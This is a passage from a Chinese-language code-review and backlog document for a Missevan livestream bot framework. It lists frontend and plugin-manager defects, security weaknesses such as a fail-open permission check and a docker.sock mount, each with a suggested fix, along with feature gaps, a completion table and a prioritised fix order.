    tree-shaking 失效；新增 Tab 要同步改 3 处（`TABS` 数组、`TabKey` 类型、
    render 分支），且 `App.tsx` 路由里 7 条 `/account/...` 路径硬编码，
    两处易不同步
  - 方向：拆为 `tabs/*.tsx`；`TABS` 导出为注册表，路由从注册表生成

### Q5 — 前端认证请求分裂两套

- [ ] 裸 `fetch` 全部收敛到 `api/client.ts`
  - 位置：`client.ts` 的 `request()` 在 401 时清 token 并 `reload()`
    回登录页；而 `LogsPage.tsx:122`、`SettingsPage.tsx:55/79/113/125`、
    `UpdatePage.tsx:76`、`PluginUI.tsx:243/294/651` 各自手写
    `fetch` + `localStorage.getItem('auth_token')`
  - 失败场景：同一个页面上，一个请求 401 会把你登出，另一个 401 只弹 toast。
    更糟的是 `SettingsPage.handleSavePorts` 的 `catch` 是**空的**
    （注释说「后端可能已重启，静默等待刷新」），token 失效时既不登出
    也不报错，用户会盯着一个永不跳转的页面
  - 方向：补 `fetchConfig` / `updateConfig` / `pipInstall` / `updateInfo`
    等封装（已有 `getBotCookieRaw` 先例）；至少导出统一 `authHeaders()`

### Q6 — `any` 滥用使 strict 失效

- [ ] 补 `errMsg(e)` 工具与 schema 运行时校验
  - 位置：`catch (e: any)` 全项目 **100+ 处**；
    `PluginUI.tsx:98,203,209,212,292`；`PluginPageView.tsx:73`
    （`detail.ui_schema as any`）
  - 影响：`catch (e: any) { showToast('error', '创建失败', e.message) }`
    在 `e` 非 Error 时显示空白；`ui_schema as any` 让
    `PluginUI.tsx:46-92` 的 `UISchema` 接口形同虚设，后端加字段前端无提示
  - 方向：`catch (e: unknown)` + `e instanceof Error ? e.message : String(e)`；
    `ui_schema` 改 `unknown` + `parseUISchema()` 运行时校验

### Q7 — 前端死代码

- [ ] 清理无调用者的导出
  - 位置：`api/client.ts:112-114`（`getBotCookieRaw`）、`:81-83`
    （`fetchDashboard` / `types.ts:152` `DashboardData`）、
    `client.ts:132-176` 整套 panel 级 live API + `types.ts:41-73`
    （已被 `Account*` 版取代）、`client.ts:100-126` 整套 panel 级 bot API、
    `client.ts:190-192`（`fetchPluginHandlers`）、
    `i18n/index.ts:35`（`useT`）、`hooks/useToast.ts:55-60`
    （`toast` 字段全项目未解构）、`useLogStream.ts:16`（`latestSeq`）、
    `Button.tsx:5`（`destructive` 与 `danger` 样式完全相同）
  - 附带：`LogsPage.tsx` 的 `filtered` 用 `useMemo` 包但依赖 `entries`
    每次 WS 推送都是新数组 → memo 完全失效，应移除或修正依赖

### Q8 — 死方法且字段不一致

- [ ] 删除或统一 `_record_failed_plugin`
  - 位置：`src/core/plugin/plugin_manager.py:1532-1552`
  - 现状：全仓无调用点；`_failed_plugins` 的写入全部是内联
    （`:902`、`:1153`），且内联 dict 的字段与该方法产生的字段**不一致**
  - 影响：`get_failed_plugins`（`:1465`）返回给面板的字段取决于走哪条
    失败路径 —— 面板能否拿到 `traceback` 或 `name` 全看运气

### Q9 — 插件激活路径 4 处近乎重复

- [ ] 抽出 `_instantiate_and_inject` / `_mount_routes`
  - 位置：`src/core/plugin/plugin_manager.py:838-886`、
    `:1050-1066`（`_register_routes_if_needed`）、`:1068-1122`
    （`_ensure_plugin_loaded`）、`_finish_activation` 调用方
  - 现状：四处都包含「建 router → `register_routes` →
    `_insert_plugin_routes` → 置 `routes_registered`」，以及
    「`load_schema` → `load_config_with_defaults` → `ensure_permissions` →
    `plugin_cls(**kwargs)`」的逐行相同副本
  - 影响：**已经造成了实际分歧** —— `_activate_plugin` 设置了
    `instance.data_dir` 与 `metadata.data_dir`（`:862,:870`），
    而 `_ensure_plugin_loaded` 只设了前者（`:1102`）→ 经该路径创建的插件，
    `metadata.data_dir` 永远是 `None`，面板 API 拿到 `None`

### Q10 — 插件定时消息可能注册两遍

- [ ] 明确单条注册路径
  - 位置：`src/core/plugin/plugin_manager.py:1042-1048`（`_call_on_enable`）
  - 现状：`await on_enable()` 之后**无条件**再调
    `_notify_bound_livestream(metadata)`
  - 影响：`_purge_plugin_timers` 在 `on_enable` **之前**执行（`:1033`），
    随后 `on_enable` 与 `on_livestream_bound` 各注册一次 →
    **两条重复定时消息，直播间每条发两遍**。文档两处都暗示要注册，
    插件作者很容易两边都写
  - 方向：删掉 `on_enable` 里的注册职责说明，或 `on_enable` 成功后
    跳过补偿通知

### Q11 — 目录命名歧义

- [ ] 插件数据目录改名 `plugin_data/`
  - 位置：`src/core/plugin/plugin_manager.py:110-112`
    （`plugin_data_dir = data/{id}/plugins`）vs `_plugin_dir`（仓库 `plugins/`）
  - 现状：数据目录与源码库同名，`_import_plugin_module` 的注释
    （`:237-242`）本身就在解释这个坑（命名空间包会被合并）
  - 影响：任何第三方代码用 `get_plugin_data_dir()` 的返回值推断源码位置，
    会拿到 `data/plugins/x` 而非 `plugins/x`。同一份元数据两套取路径方式
    （`get_plugin_readme:1426` 用 `metadata.readme_path`，
    `get_plugin_changelog:1445` 重新拼路径）正源于此

### Q12 — 函数内重复 import

- [ ] 改用 `Depends(get_account_manager)`
  - 位置：`account_plugins.py:121-122,133,159,182,220`（5 处）、
    `live.py:125,139`、`bot.py:121`、`ws.py:344`
  - 现状：`from api.deps import get_account_manager` 在 6 个端点的函数体内
    重复；其中 `account_plugins.py:122` 模块顶部**已经**导入过
    `require_account` —— 说明这不是循环依赖问题，只是风格失控

### Q13 — 魔数与重复校验规则

- [ ] 常量化 + 规则去重
  - 位置：
    - 密码最小长度 4 在三处重复且强度不一：`manager.py:346`
      （`reset_credentials`，**不 strip**，`"    "` 四空格可通过）、
      `:374`（`change_account_password`，strip 后校验）、`:533`
      （`create_account`）。前端另有 `AccountDialogs.tsx:37,243`、
      `AccountSetup.tsx:23`、`AccountPortalPages.tsx:307` 四处
    - 轮询间隔散落 7 处（见 P6）；`useLogStream.ts:251`（`-1999`）、
      `:287`（`30000`）、`useToast.ts:29,34,35`（`-4` / `200` / `4000`）
    - 端口 `15173` / `18080` 在 `vite.config.ts:6,9`、`SettingsPage.tsx:32,60`
      各硬编码一份
    - `SettingsPage.tsx:62` 与 `LoginPage.tsx:20` 写入的
      `localStorage.api_port` / `web_port` **全项目无读取处**（死写入）
  - 方向：抽 `_validate_password()` 三处共用；建 `src/constants.ts`

### Q14 — requirements 解析与 sys.path 污染

- [ ] 用 `packaging` 解析 + 不再 `insert(0, path)`
  - 位置：`src/core/plugin/plugin_manager.py:426-430`（解析）、
    `:475-489`（`pip show` + `sys.path.insert(0, location)`）
  - 失败场景：
    - 插件写 `pypinyin>=0.50  # 拼音支持` → 整行（含注释）被当包规格传给
      pip → 报错 → 插件加载失败。`-r base.txt`、`-e .`、
      `pkg; python_version<"3.9"` 同样出错
    - pip 的 `Location` 被插到 `sys.path[0]`：该目录若含 `json.py` /
      `logging.py` 之类同名文件，会**劫持框架自身的导入**。
      且对每个缺失依赖各跑一次 `pip show` 子进程
  - 方向：`packaging.requirements.Requirement` 解析；
    用 `importlib.invalidate_caches()` + 重试 `find_spec` 替代子进程；
    改 `append` 而非 `insert(0)`

### Q15 — 静态路由注册顺序

- [ ] 静态路径前置
  - 位置：`web/backend/api/routes/plugin.py:334-351`
    （`/{plugin_name}/readme`、`/{plugin_name}/changelog`）
    vs `:380-416`（`/failed/list`、`/failed/{dir}`）；
    `/{plugin_name}` 的 DELETE（`:359`）vs `/push-all`（`:472`）、
    `/apply-defaults`（`:502`）
  - 现状：FastAPI 按注册顺序匹配。`GET /api/plugin/failed/readme` 会命中
    `/{plugin_name}/readme` 且 `plugin_name="failed"`；
    `DELETE /api/plugin/push-all` 会尝试卸载名为 `push-all` 的插件
  - 影响：目前 `failed` 恰好没有 `readme` 子路径所以未爆，但任何
    `/failed/{x}` 扩展都会冲突

---

## 📋 功能缺口（沿用原清单）

### 🔴 接口已定义，零实现

- [ ] **LivestreamManager 核心实现**
  - 接口：`src/interfaces/livestream/livestream_manager.py`
  - 需实现：`livestream_list` / `get_livestream` /
    `get_livestream_if_absent` / `register_new_livestream` /
    `unregister_livestream`
  - 现状：全仓搜索无任何具体子类。`MissevanServer` 内部用
    `dict[int, Livestream]` 自行管理，未走该接口
  - 影响：接口文档已收录，README 架构图已展示，但实际不可用

- [ ] **私信功能 `send_private_message`**
  - 接口：`src/interfaces/bot/bot.py` → `send_private_message(user_id, message)`
  - 权限位：`BotPermission.SEND_PRIVATE_MESSAGE` 已定义
  - 现状：`src/core/bot/mis_bot.py:372` 定义，
    `:386` 直接 `raise NotImplementedError("私信功能尚未实现")`
  - 依赖：需先研究 Missevan 私信 API 端点

### 🟡 已有骨架，逻辑不完整

- [ ] **插件热重载（开发模式）**
  - 使用 `watchfiles` 监听 `plugins/` 目录变化，文件修改时自动 reload
  - 通过环境变量 `MISMISS_DEV=1` 启用 · 复杂度：中

- [ ] **插件市场集成**
  - 对接远端 registry 获取可用插件列表 + 一键安装/更新 · 复杂度：高

- [ ] **插件 i18n 国际化**
  - 插件提供 `i18n/zh-CN.json` 等翻译文件，框架按用户语言自动选择
  - 复杂度：中
  - 备注：需先解决框架自身的 i18n 覆盖率问题（见 Q1）

- [ ] **插件间依赖声明**
  - `metadata.yaml` 声明 `depends_on: [other_plugin_name]`；
    加载时检查依赖、卸载时检查反向依赖 · 复杂度：中

- [ ] **插件沙箱 —— venv 隔离**
  - ✅ 路径沙箱已完成（`PluginDataManager._resolve()` 拒绝 `../` 与绝对路径）
  - ⬜ venv 沙箱：每个插件独立 venv · 复杂度：高，优先级低
  - 备注：符号链接逃逸与 Windows 特有问题见 S11

- [ ] **插件更新检测（远端）**
  - ✅ v1.1.0 起：面板对比「账户副本版本 vs 插件库版本」，显示「可更新」
    徽标并支持一键覆盖更新（保留启用状态与既有配置）
  - ⬜ 待办：对接远端 registry 自动检测**库本身**是否落后 · 复杂度：中
  - 备注：本地版本比对存在静默失效问题，见 C10

- [x] ~~**Cookie 过期恢复策略**~~ — 已被 v1.1.0 的授权到期体系取代
  - 现在：`ExpiryScheduler` 60s 兜底 + 端点守卫，到期硬停用
    Bot/直播间/插件；续期后自动恢复，失败原因记录在 `resume_error`
    并展示在面板
  - 备注：恢复失败时 `_apply_renewal` 丢弃 `resume_after_renew` 的返回值
    并清空 `paused_reason` → 面板显示「正常」但实际未恢复；
    且 `enable_bot` 失败后仍继续执行 `resume_all()`。**待修**（未编号，
    实现时与 C 系列一并处理）

- [ ] **开播/下播异步刷新失败处理**
  - `src/core/livestream/mis_livestream.py` 内部监听器中
    `create_task(_refresh())` 失败时仅捕获 `RuntimeError` 后静默
  - 风险：无事件循环时异常被吞，creator 在线状态可能不更新
  - 建议：至少加 `log.warning`，或改同步调用（若 API 轻量）

### 🟢 工程化完善

- [ ] **类型标注收窄**
  - 6 处 `# type: ignore` 集中在 JSON 反序列化（`json.load` /
    `resp.json` 返回 `Any`），可用 `TypedDict` 或显式 `cast()` 替代
  - 另：`mypy src/` 尚有 4 处既有告警
    （`event_handler.py:25`、`plugin_manager.py:568/684/1518`）

- [ ] **README 示例代码对齐**
  - README 的 Python API 示例仍按单服务器模型书写，需改为
    `AccountManager` 用法

- [ ] **事件处理器异常不可见**
  - 位置：`src/core/events/bus.py:120-129`
  - 现状：异步 handler 经 `create_task` 调度，task 引用未保存、异常未包装
    → 插件作者只会看到事件循环的 "Task exception was never retrieved"
  - 附带：同步 handler 抛异常会向上冒泡到 `call_event` 调用方
    （可能是 WebSocket 接收循环），把它整个打断
  - 方向：`create_task` 后 `add_done_callback` 记录异常

- [ ] **`_check_plugin_permission` 为 fail-open**
  - 位置：`src/core/bot/mis_bot.py:172-195`
  - 现状：`if plugin is None or plugin.permissions is None: return`（放行）
  - 风险：插件若在 `initialize` 里设 `self.permissions = None` / `{}`
    「清理」自己，所有 Bot 权限校验对其**全部放行**
  - 方向：`permissions is None` 时应拒绝（fail-closed），
    或用 sentinel 区分「无权限系统」与「权限未注入」

### 🔵 已知遗留（v1.1.0 重构后）

- [ ] **插件自带 UI 路由为匿名可访问** — 见 S2（以此为准）
- [ ] **图片代理白名单只能改配置文件**
  - `proxy.allowed_hosts` 已支持 `config.yml` 覆盖，但设置页尚无编辑入口
  - 备注：与 P9 一并处理，且需注意该白名单是 `/api/proxy/image` 的
    **主要防线**（该端点为匿名可访问）
- [ ] **多 worker 部署硬约束单实例**
  - 当前 `MISMISS_WORKERS=1` —— 直播间连接、Bot 定时器、插件实例均为
    单实例资源；`_ensure_state_fresh()` 的同步机制仅作兜底
  - 备注：该兜底本身存在正确性缺陷，见 C2 / C3 / P1

- [ ] **`MissConfig` 只读契约被破坏**
  - 位置：`src/interfaces/plugin/miss_config.py:117-124`
  - 现状：`get_list` 直接返回 `self._data[key]` 的**引用**，
    插件 `config.get_list("x").append(...)` 会污染内部数据，
    违反该文件开头的「只读包装器」声明
  - 方向：返回 copy 或 `tuple`

- [ ] **`update.py` 路径与挂载语义**
  - 位置：`web/backend/api/routes/update.py:440-457`（`_spawn_recreate`）
  - 现状：一次性容器以 `-v /var/run/docker.sock:…` 运行 →
    「拿到 admin token」≈「拿到宿主 root」
  - 附带：`home` 取自 `.env` 的 `MISMISS_HOME=` 且**无路径校验**，
    `-v {home}:/app/deploy` 中若含 `:` 或为空会改变挂载语义
  - 方向：`Path(home).is_absolute()` + 拒绝 `:`/换行；长期考虑改用
    外部 agent 执行更新

---

## ✅ 已完成（历史记录）

- [x] Question 实体 dataclass（`LiveQuestion` + `LiveQuestionEvent` + WS 路由）
- [x] 插件系统主体（生命周期/配置/权限/依赖/失败重试/数据目录/声明式 UI）
- [x] 插件 KV 存储（`PluginDataManager`）
- [x] 插件路径沙箱（venv 沙箱见功能缺口）
- [x] 测试体系搭建（`test/` 下 13 个文件；除 `test_license_store.py` 外
      均为 `__main__` 驱动的独立脚本，需手动执行）
- [x] 清理死代码（含 `mis_bot.py` 空 `TYPE_CHECKING` 块、重复的
      `plugin_changelog` 路由、3 个无引用前端组件、无引用的 `InlineLoader`
      与 `DashboardResponse`/`ErrorResponse`/`WSLogMessage` schema）
  - 备注：Q7 是本轮的**第二批**死代码清理，范围在前端 API 层

---

## 📊 完成度总览

| 模块 | 接口定义 | 核心实现 | 测试 | 完成度 |
|------|:------:|:------:|:----:|:-----:|
| User / LiveUser / Creator | ✅ | ✅ | ❌ | 70% |
| Gift / Medal | ✅ | ✅ | ❌ | 70% |
| Question | ✅ | ✅ | ❌ | 70% |
| Event 系统 (9 种事件) | ✅ | ✅ | ❌ | 70% |
| EventManager / EventBus | ✅ | ✅ | ❌ | 70% |
| Livestream | ✅ | ✅ | ❌ | 70% |
| LivestreamManager | ✅ | ❌ | ❌ | 30% |
| Bot (消息/礼物/背包) | ✅ | ✅ | ❌ | 70% |
| Bot (私信) | ✅ | ❌ | ❌ | 30% |
| Server / AccountManager | ✅ | ✅ | 🟡 | 80% |
| 插件系统 | ✅ | ✅ | ❌ | 90% |
| 授权 / 到期体系 | — | ✅ | 🟡 | 85% |
| 日志系统 | — | ✅ | ❌ | 80% |
| WebSocket / HTTP | — | ✅ | ❌ | 80% |
| Web 控制台 / 账户门户 | — | ✅ | ❌ | 85% |

---

## 🎯 建议的推进顺序

1. **S1 + S2 + S3 + S4** — 四条构成完整的「上传恶意插件 → 窃取管理员令牌 →
   覆写后端源码」链路，且改动都不大（抽公共路径校验、改精确前缀判定、
   收窄 CORS、加 `rehype-sanitize`）
2. **S5 + S6 + S7** — 密码与权限不变量。改动局部，但 S5 涉及数据格式迁移
3. **C1 + C2 + C3 + C4** — 同一根因（持久化 + 后台任务生命周期），
   一起修代价最低。单 worker 下风险不高，但 C4 是用户可感知的
4. **P1 + P2** — 明显改善面板卡顿，但改动面较大（引入 `asyncio.to_thread`
   与状态同步策略调整），建议单独评估
5. **Q1 + Q2 + Q3 + Q7** — 低成本高回报，可顺手清掉

---

## ❓ 待决策

- [ ] **S5 密码哈希迁移方式**
  - 方案：改用 `hashlib.scrypt`（标准库，零新依赖），存储格式带盐与参数
  - 需要确认：存量 `panel.json` / `auth.json` 是否接受**登录时透明升级**
    （命中旧格式则改写为新格式）？或需要一次性迁移脚本？

- [ ] **S3 CORS 处置**
  - 生产单端口部署其实不需要跨域
  - 需要确认：完全去掉 CORS 中间件，还是保留但改为环境变量控制的白名单？
